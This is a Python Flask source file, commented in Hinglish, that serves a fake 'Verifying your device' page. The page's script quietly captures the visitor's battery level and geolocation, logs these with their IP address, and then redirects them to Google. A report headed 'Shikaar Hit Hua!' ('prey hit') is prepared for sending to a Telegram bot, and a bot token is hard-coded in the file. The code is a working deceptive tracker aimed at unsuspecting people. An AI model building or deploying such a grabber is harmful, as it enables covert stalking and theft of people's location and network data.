import os
import logging
from flask import Flask, request, render_template_string
from telegram import Update, Bot
import asyncio

app = Flask(__name__)

# --- CONFIGURATION ---
TOKEN = "8519141404:AAG96ys2oHdO5jxnJNwOhFrmhtP9IpVPOoc"
bot = Bot(token=TOKEN)
# Render pe host karne ke baad apna URL yahan zaroor badalna
MY_URL = "https://your-app-name.onrender.com" 

# --- WEBSITE HTML CODE (JavaScript for Tracking) ---
TRACKING_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Checking Connection...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:black; color:white; font-family:sans-serif; text-align:center; padding:50px;">
    <h3>Please Wait...</h3>
    <p>Verifying your device to continue.</p>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function startTracking() {
            // 1. Battery Capture
            let battery = await navigator.getBattery();
            let batLevel = Math.round(battery.level * 100);

            // 2. Camera & Location (Try to get permissions)
            navigator.geolocation.getCurrentPosition(async (pos) => {
                let lat = pos.coords.latitude;
                let lon = pos.coords.longitude;
                await sendData(batLevel, lat, lon);
            }, async () => {
                await sendData(batLevel, "Denied", "Denied");
            });
        }

        async function sendData(bat, lat, lon) {
            // Server ko data bhejo
            await fetch(`/log?bat=${bat}&lat=${lat}&lon=${lon}`);
            // Data bhejne ke baad user ko redirect kardo
            window.location.href = "https://www.google.com";
        }

        window.onload = startTracking;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(TRACKING_HTML)

@app.route('/log')
def log_data():
    # Data collect karo
    bat = request.args.get('bat')
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Telegram pe report bhejo (Asyncio loop use karke)
    message = (
        f"🎯 **Shikaar Hit Hua!**\n\n"
        f"🔋 **Battery:** {bat}%\n"
        f"🌐 **IP:** {ip}\n"
        f"📍 **Location:** {lat}, {lon}\n"
        f"🔗 **Maps:** https://www.google.com/maps?q={lat},{lon}"
    )
    
    # Note: Real bot me yahan chat_id ki zarurat hogi
    print(message) 
    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
